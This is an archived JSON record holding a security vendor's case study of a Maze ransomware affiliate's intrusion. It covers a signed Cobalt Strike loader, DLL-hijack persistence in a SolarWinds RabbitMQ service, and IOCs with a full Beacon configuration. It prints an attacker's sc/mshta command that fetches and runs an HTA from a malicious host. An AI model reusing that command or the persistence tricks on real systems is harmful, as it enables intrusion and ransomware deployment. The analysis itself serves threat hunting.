{
    "id": "96b6d0ac-d5b8-42da-9f59-27f819bb9ed2",
    "created_at": "2023-01-12T15:04:25.132621Z",
    "updated_at": "2025-03-27T02:09:18.48245Z",
    "deleted_at": null,
    "sha1_hash": "6ca011271d132ba573ba76407aff93575a077628",
    "title": "2020-08-13 - Case Study- Catching a Human-Operated Maze Ransomware Attack In Action",
    "authors": "",
    "file_creation_date": "2022-05-28T19:23:53Z",
    "file_modification_date": "2022-05-28T19:23:53Z",
    "file_size": 1492142,
    "plain_text": "# Case Study: Catching a Human-Operated Maze Ransomware Attack In Action\n\n**[labs.sentinelone.com/case-study-catching-a-human-operated-maze-ransomware-attack-in-action/](https://labs.sentinelone.com/case-study-catching-a-human-operated-maze-ransomware-attack-in-action/)**\n\nJim Walter\n\n## Executive Summary\n\nMaze ransomware is one of the most widespread ransomware strains currently in the\nwild and is distributed by different capable actors.\nWe discovered a Maze affiliate deploying tailor-made persistence methods prior to\ndelivering the ransomware.\nThe actor appears to have used a stolen certificate to sign its Beacon stager.\nIn common with other attacks, the actor used an HTA payload as an interactive shell,\nwhich we were able to catch live and deobfuscate.\n\n## Background\n\nMaze ransomware has been used extensively in the last year or so as the final payload by\nmany different actors around the world. This year, Maze operators notoriously began\nextorting companies not just by encrypting files but also through threatening to publish\nexfiltrated files online. We recently caught one Maze affiliate at the early stage of attempting\nto spread through a network belonging to one of our clients.\n\n\n-----\n\nIn this post, we share details about the methods used by this Maze affiliate in order to shed\nlight on their tactics and to help security teams hunt for similar IOCs in their own networks.\n\n## Attack Entry Point\n\n[As previously reported in other Maze incidents, the attackers used RDP to gain access to an](https://www.sentinelone.com/wp-content/uploads/enter-the-maze-demystifying-an-affiliate-involved-in-maze-snow/)\ninternet-facing machine, probably by brute-forcing the Administrator’s password. One of the\nattacks against a US company began on Saturday the 4th of July, a date obviously chosen in\nthe hope that many people – particularly security staff – might not be at work that day.\n\nThe attackers connected using RDP and uploaded their beacon payload, disguised as a\nknown Microsoft binary named netplwiz.exe. Their payload had the same icon and\ndescription as the genuine binary of the same name and was also signed, most likely with a\nstolen certificate.\n\nSysinternals’ sigcheck.exe on original netplwiz.exe:\n```\nc:windowssystem32Netplwiz.exe:\n    Verified:    Signed\n    Signing date:  10:29 AM 6/6/2020\n    Publisher:   Microsoft Windows\n    Company:    Microsoft Corporation\n    Description:  Advanced User Accounts Control Panel\n    Product:    Microsoft« Windows« Operating System\n    Prod version:  10.0.18362.1\n    File version:  10.0.18362.1 (WinBuild.160101.0800)\n\n```\n[In the malicious netplwiz.exe, we can see the stolen certificate:](https://www.virustotal.com/gui/file/81a9ced421d01a2f9a7bf1335d227eee19606fe220a50ecf96a78abca6cc816b/details)\n```\nc:huntingcwcnetplwiz.exe.mal:\n    Verified:    Signed\n    Signing date:  8:05 PM 7/3/2020\n    Publisher:   Clubessential, LLC.\n    Company:    Microsoft Corporation\n    Description:  Advanced User Accounts Control Panel\n    Product:    Microsoft« Windows« Operating System\n    Prod version:  6.1.7600.16385\n    File version:  6.1.7600.16385 (win7_rtm.090713-1255)\n\n```\nA closer look at the certificate:\n\n\n-----\n\nThis executable is a simple packer that loads Cobalt Strike’s Beacon version 4. This packer\nis pretty simple, and does the following:\n\nHides their window\n[Checks for a debugger using isDebuggerPresent](https://docs.microsoft.com/en-us/windows/win32/api/debugapi/nf-debugapi-isdebuggerpresent)\n[Decodes a XOR’ed stageless beacon (note – using VirtualAllocExNuma for memory](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocexnuma)\n[allocation instead of the more commonly used VirtualAlloc/Ex)](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex)\nExecutes the beacon\n\nThe decoding function looks like this:\n\n\n-----\n\n[We dumped the beacon from memory and parsed its configuration:](https://github.com/Sentinel-One/CobaltStrikeParser)\n\n## Tailor-Made Persistence Mechanisms\n\nAlthough the entry method is pretty common, the attackers displayed great creativity in their\npersistence methods, which were tailor-made to the machine they found themselves on.\n\nFor example, one host was running a SolarWinds Orion instance. This Orion product uses\nRabbitMQ as the internal messaging component and is installed with the product. RabbitMQ\n[is written in Erlang, and therefore uses the Erlang runtime service (erlsrv.exe) to run.](https://erlang.org/doc/man/erlsrv.html)\n\nThe attackers relied on this dependency chain to spawn themselves in this erlsrv.exe\nprocess and to gain persistence on the host, as the RabbitMQ service is running erlsrv.exe.\n\n\n-----\n\nWe could see this when the attackers dropped two DLLs containing their beacon stager to\ndisk and then began interfering with the RabbitMQ service:\n```\ntasklist /SVC\nsc qc RabbitMQ\nUploaded: C:Program Files (x86)SolarWindsOrionErlangerts-7.1binacluapi.dll \nUploaded: C:Program Files (x86)SolarWindsOrionErlangerts-7.1binversion.dll\nsc stop RabbitMQ\nsc start RabbitMQ\n\n```\nThe DLL that was hijacked is version.dll, which is normally loaded from the system32 folder.\nBy dropping it in the same folder as erlsrv.exe, it loaded their version.dll, and it loaded\n_acluapi.dll containing the beacon._\n\nAfter restarting the RabbitMQ service, a Cobalt Strike Beacon started communicating to the\nsame domain as the one from netplwiz, but this time from erlsrv.exe and SYSTEM integrity\nlevel.\n\nIn another case showing similar adaptation to the local environment, the attackers targeted\nthe Java Updater which runs when the computer starts and dropped a DLL that is loaded by\n_jusched.exe when it starts._\n\nAfter installing persistency, the attackers did some domain reconnaissance and uploaded\n[ngrok to C:Windowsdwm.exe and used it for tunneling.](https://ngrok.com/)\n\nThey also ran this:\n```\nsc config UI0Detect start= disabled\n\n```\n[The UI0Detect, like the name implies, detects and alerts the user if a program in session 0](https://itshi-tech.blogspot.com/2017/09/what-is-interactive-services-detection.html)\ntries to interact with the desktop. It’s important for them to disable this service in order to\navoid alerting the user in case they accidentally pop a message box or starting a GUI\napplication while running as SYSTEM.\n\n## HTA Payload\n\nWhen they found an interesting server they wanted to laterally move to, they used sc.exe\nand deployed a tool that gave them an online shell on that target.\n\nSpecifically, they ran this command (IP changed):\n```\nsc 192.168.90.90 config MiExchange binPath= \"c:windowssystem32cmd.exe /c start mshta\nhttp://crt.officecloud[.]top/st\"\n\n```\n[They used mshta to run an HTA payload that was hosted on their site. We believe the HTA is](https://lolbas-project.github.io/lolbas/Binaries/Mshta/)\ntheir way of working online on remote computers before deploying their Cobalt Strike\nBeacon, if they believe it’s worth it.\n\n\n-----\n\nThe HTA payload is a somewhat sophisticated and automatically obfuscated code that we\nbelieve is self-made (as we’ve found no evidence of it online).\n\n[You can see the obfuscated and our de-obfuscated version here.](https://gist.github.com/Kristal-g/e0b6756bb5610470e78d892251cefbf6)\n\nMain Loop – Encoded vs Decoded\nWhen ran, it first sends some basic information of the computer, such as OS Version, routing\ninfo, Domain Controller name (if the computer is member of a domain) and more:\n\nThe payload contains a variable that is empty when it is first run. In this case, it runs another\nHTA from the server using mshta.exe, which is identical to itself except that the variable now\ncontains the value “prfx” instead of being empty.\n\nConsequently, it enters a loop of running HTAs from the server.\n\nThe simplified code looks as follows:\n\n\n-----\n\n```\ntry {\n  if (mainFuncStruct.emptyIfFirstRun != \"prfx\") {\n    try {\n      mainFuncStruct.funcStruct6.runMshtaFromCNC(\"\");\n    } catch (e) {\n      mainFuncStruct.funcStruct6.sendErrorDataToCNC(e)\n    }\n    mainFuncStruct.killSelf();\n  } else {\n    if (mainFuncStruct.isRunningInMshta())\n      LimitedRunLoop();\n    else\n      InfiniteRunLoop();\n  }\n} catch (e) {\n  mainFuncStruct.funcStruct6.sendErrorDataToCNC(e);\n}\n\n```\nThe payload is interesting because it has some unique behavior:\n\n1. It can be run both as a JScript file and as an HTA file\n2. It never receives simple cmd.exe commands from the server, only HTAs (that may run\n\n_cmd.exe themselves)_\n3. It’s obfuscated automatically and differently every time it is requested from the server\n\nAlso worth noting from a hunting perspective is that it runs net1.exe directly, instead of\n_net.exe, probably to evade EDR and command-line based detection methods._\n\n## Conclusion\n\nAll of the above shows that these are very capable attackers. Although they used mostly\nknown methods, they also showed some creativity to compromise targets successfully and\nmove laterally inside them with ease and speed. However, they were still caught and\nmitigated by the [SentinelOne agent before any harm was done.](https://www.sentinelone.com/platform/)\n\nAs their HTA-serving server is still online, and since this campaign is still going strong, we\nrecommend security teams to check for the following IOCs in their EDR data or SIEM and\nquickly mitigate any that are found to prevent the ransomware being deployed.\n\n## Indicators of Compromise\n\n**HTA Payload Servers**\ncrt.officecloud[.]top\ncrt.globalsign[.]icu\nmhennigan.safedatasystems[.]com\n\n**CS Beacon Server**\nocspverisign[.]pw\n\n\n-----\n\n**Other Tools Used**\nngrok.exe\nCertificate signer: “Clubessential, LLC.”\n\n**Full Beacon Configuration**\n```\nBeaconType            - HTTPS\nPort               - 443\nSleepTime            - 61107\nMaxGetSize            - 1048580\nJitter              - 13\nMaxDNS              - 245\nC2Server             pkcs.ocspverisign.pw,/MFEwTzBNMEswSTAJBgUrDgMCGgUABBQe6LNDJdqx2BJOp7hVgTeaGFJ2FC\ncrl.ocspverisign.pw,/MFEwTzBNMEswSTAJBgUrDgMCGgUABBQe6LNDJdqx2BJOp7hVgTeaGFJ2FC\npfx.ocspverisign.pw,/MFEwTzBNMEswSTAJBgUrDgMCGgUABBS56bKHAoUD2BOyl2B0LhPg9JxyQm\nUserAgent            - Microsoft-CryptoAPI/10.0\nHttpPostUri           /MFEwTzBNMEswSTAJBgUrDgMCGgUABBSLIycRsoI3J6zPns4K1aQgAqaqHgQUZ\nHttpGet_Metadata         - Cookie: cdn=ocsp;\n                  Cookie\nHttpPost_Metadata        - Content-Type: application/ocsp-request\n                  Cookie: cdn=ocsp;\n                  u\nDNS_Idle             - 8.8.8.8\nDNS_Sleep            - 0\nHttpGet_Verb           - GET\nHttpPost_Verb          - POST\nHttpPostChunk          - 0\nSpawnto_x86           - %windir%syswow64werfault.exe\nSpawnto_x64           - %windir%sysnativewuauclt.exe\nCryptoScheme           - 0\nProxy_Behavior          - Use IE settings\nWatermark            - 305419896\nbStageCleanup          - False\nbCFGCaution           - False\nKillDate             - 0\nbProcInject_StartRWX       - True\nbProcInject_UseRWX        - False\nbProcInject_MinAllocSize     - 21036\nProcInject_PrependAppend_x86   b'x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90'\n                  Empty\nProcInject_PrependAppend_x64   b'x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90x90'\n                  Empty\nProcInject_Execute        - ntdll.dll:RtlUserThreadStart\n                  SetThreadContext\n                  RtlCreateUserThread\nProcInject_AllocationMethod   - VirtualAllocEx\nbUsesCookies           - True\n\n```\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-08-13 - Case Study- Catching a Human-Operated Maze Ransomware Attack In Action.pdf"
    ],
    "report_names": [
        "2020-08-13 - Case Study- Catching a Human-Operated Maze Ransomware Attack In Action.pdf"
    ],
    "threat_actors": [
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673535865,
    "ts_updated_at": 1743041358,
    "ts_creation_date": 1653765833,
    "ts_modification_date": 1653765833,
    "files": {
        "pdf": "https://archive.orkl.eu/6ca011271d132ba573ba76407aff93575a077628.pdf",
        "text": "https://archive.orkl.eu/6ca011271d132ba573ba76407aff93575a077628.txt",
        "img": "https://archive.orkl.eu/6ca011271d132ba573ba76407aff93575a077628.jpg"
    }
}